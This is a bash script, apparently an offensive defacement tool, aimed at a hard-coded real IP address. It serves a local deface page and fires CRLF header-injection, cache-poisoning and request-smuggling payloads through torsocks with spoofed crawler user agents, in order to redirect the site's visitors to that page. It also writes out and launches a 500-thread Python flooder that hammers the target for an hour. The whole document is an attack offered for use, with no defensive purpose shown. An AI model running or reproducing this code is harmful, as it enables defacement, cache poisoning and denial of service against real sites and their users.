#!/bin/bash
# TRUSTEDF57_PERMANENT_DEPLOY_LOCAL.sh - 100% LOCAL HOST AUTO IP DISCOVERY
# No ngrok - uses YOUR machine IP directly + auto-detects HTML

set -euo pipefail

# Config
TARGET="132.185.210.70"
DEFACE_PORT=8080
CACHE_DURATION=86400  # 24h
THREADS=500
BLAST_DURATION=3600   # 1h

echo "💥 TRUSTEDF57 PERMANENT LOCAL DEPLOY v3.0 - NO NGROK 100% AUTO"
echo "Target: http://$TARGET"

# 1. AUTO-DETECT DEFACE FILE
find_deface() {
    local deface_file=""
    for file in *.html deface.html index.html TRUSTEDF57*.html f57.html; do
        if [[ -f "$file" ]]; then
            deface_file="$file"
            break
        fi
    done
    
    if [[ -z "$deface_file" ]]; then
        echo "❌ No HTML deface file found!"
        echo "Create: deface.html, index.html, or TRUSTEDF57*.html"
        exit 1
    fi
    
    DEFACE_FILE="$deface_file"
    echo "[+] Deface: $DEFACE_FILE ($(wc -c < "$DEFACE_FILE") bytes)"
}

# 2. AUTO-DISCOVER PUBLIC IP
get_public_ip() {
    echo "[+] Auto-discovering public IP..."
    
    # Try multiple methods
    PUBLIC_IP=$(curl -s icanhazip.com 2>/dev/null || \
                curl -s ifconfig.me 2>/dev/null || \
                curl -s ipinfo.io/ip 2>/dev/null || \
                curl -s 2ip.io 2>/dev/null || \
                echo "127.0.0.1")
    
    if [[ "$PUBLIC_IP" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        echo "[+] Public IP: $PUBLIC_IP"
        echo "[+] Deface URL: http://$PUBLIC_IP:$DEFACE_PORT/$DEFACE_FILE"
        PUBLIC_IP="$PUBLIC_IP"
    else
        echo "❌ Failed to detect public IP! Manual override needed."
        read -p "Enter your public IP: " PUBLIC_IP
    fi
}

# 3. START LOCAL SERVER
start_server() {
    echo "[+] Starting HTTP server on port $DEFACE_PORT..."
    python3 -m http.server $DEFACE_PORT > server.log 2>&1 &
    SERVER_PID=$!
    
    sleep 3
    if ! curl -s "http://localhost:$DEFACE_PORT/$DEFACE_FILE" > /dev/null; then
        echo "❌ Server failed to start!"
        kill $SERVER_PID 2>/dev/null
        exit 1
    fi
    echo "[+] Server running PID: $SERVER_PID"
}

# 4. ULTIMATE CACHE POISON
poison_cache() {
    local deface_url="http://$PUBLIC_IP:$DEFACE_PORT/$DEFACE_FILE"
    echo "[+] 🚀 POISONING with: $deface_url"
    
    # Multi-vector payloads
    declare -a payloads=(
        "http://$TARGET/?q=%0d%0aLocation:%20$deface_url%0d%0aContent-Type:%20text/html%0d%0aCache-Control:%20public,max-age=$CACHE_DURATION"
        "http://$TARGET/?search=%0d%0aLocation:%20$deface_url%0d%0aSet-Cookie:%20defaced=F57;Path=/"
        "http://$TARGET/?q=%250d%250aLocation:%20$deface_url%0d%0aCache-Control:%20public,max-age=$CACHE_DURATION"
        "http://$TARGET/search?q=%0aLocation:%20$deface_url"
        "http://$TARGET/?q=Location:%20$deface_url"
    )
    
    # Initial massive barrage
    for payload in "${payloads[@]}"; do
        for ua in "Googlebot/2.1" "bingbot/2.0" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"; do
            torsocks curl -s "$payload" \
                -H "User-Agent: $ua" \
                -H "Cache-Control: no-cache" \
                -H "X-Forwarded-For: 127.0.0.1" \
                -H "Accept: text/html" &
        done
    done
    
    # Request smuggling
    torsocks curl -s --path-as-is \
        "http://$TARGET/GET%20/%20HTTP/1.1%0d%0aHost:%20$TARGET%0d%0aContent-Length:%200%0d%0a%0d%0aGET%20/?q=%0d%0aLocation:%20$deface_url%20HTTP/1.1%0d%0aHost:%20$TARGET%0d%0a" &
    
    wait
    echo "[+] Initial poison complete!"
}

# 5. THREAD BLASTER
start_blaster() {
    local deface_url="http://$PUBLIC_IP:$DEFACE_PORT/$DEFACE_FILE"
    echo "[+] Launching $THREADS thread blaster ($BLAST_DURATION s)..."
    
    cat > f57_blaster.py << EOF
import requests, threading, time, random, os
TARGET = '$TARGET'
DEFACE_URL = '$deface_url'
THREADS = $THREADS
DURATION = $BLAST_DURATION

UAS = ['Googlebot/2.1','bingbot/2.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36']
PAYLOADS = [
    f'http://{{TARGET}}/?q=%0d%0aLocation:%20{{{DEFACE_URL}}}%0d%0aCache-Control:%20public,max-age=86400',
    f'http://{{TARGET}}/?search=%0d%0aLocation:%20{{{DEFACE_URL}}}',
    f'http://{{TARGET}}/search?q=%0aLocation:%20{{{DEFACE_URL}}}'
]

def poison():
    while True:
        try:
            url = random.choice(PAYLOADS).format(TARGET=TARGET, DEFACE_URL=DEFACE_URL)
            requests.get(url, headers={'User-Agent':random.choice(UAS), 'Cache-Control':'no-cache'}, timeout=1)
        except: pass

print(f'🚀 F57 LOCAL BLASTER | {THREADS} threads | {DEFACE_URL}')
threads = [threading.Thread(target=poison, daemon=True) for _ in range(THREADS)]
for t in threads: t.start()

try:
    for i in range(DURATION):
        print(f"\\rBlasting... {i}s | {len([t for t in threads if t.is_alive()])} active", end='')
        time.sleep(1)
except KeyboardInterrupt:
    print("\\n[!] Blaster stopped")
EOF

    nohup python3 f57_blaster.py > blaster.log 2>&1 &
    BLASTER_PID=$!
    echo ""
    echo "[+] Blaster PID: $BLASTER_PID | Logs: tail -f blaster.log"
}

# 6. VERIFICATION
verify() {
    echo "[+] 🔍 LIVE VERIFICATION..."
    echo "=== ROOT ==="
    curl -s -I "http://$TARGET/" | grep -E "(Location|Cache|Set-Cookie)" || echo "No poison headers"
    echo ""
    echo "=== ?q= ==="
    curl -s "http://$TARGET/?q=" | head -10 || echo "No response"
    echo ""
    echo "=== YOUR SERVER ==="
    curl -s "http://$PUBLIC_IP:$DEFACE_PORT/$DEFACE_FILE" | head -5
    echo ""
}

# 7. CLEANUP FUNCTIONS
cleanup() {
    echo "[+] Cleaning up..."
    kill $SERVER_PID $BLASTER_PID 2>/dev/null
    rm -f f57_blaster.py
    echo "[+] Cleanup done"
    exit 0
}
trap cleanup SIGINT SIGTERM

# MAIN
main() {
    find_deface
    get_public_ip
    start_server
    poison_cache
    start_blaster
    verify
    
    echo ""
    echo "🎯 ✅ DEPLOYMENT COMPLETE!"
    echo "📱 Test browser:"
    echo "  http://$TARGET/"
    echo "  http://$TARGET/?q="
    echo "💀 Deface live: http://$PUBLIC_IP:$DEFACE_PORT/$DEFACE_FILE"
    echo ""
    echo "📊 Monitor: tail -f blaster.log server.log"
    echo "🛑 Ctrl+C or: pkill -f 'python.*(blaster|http.server)'"
    
    # Keep alive
    wait $BLASTER_PID
}

main "$@"
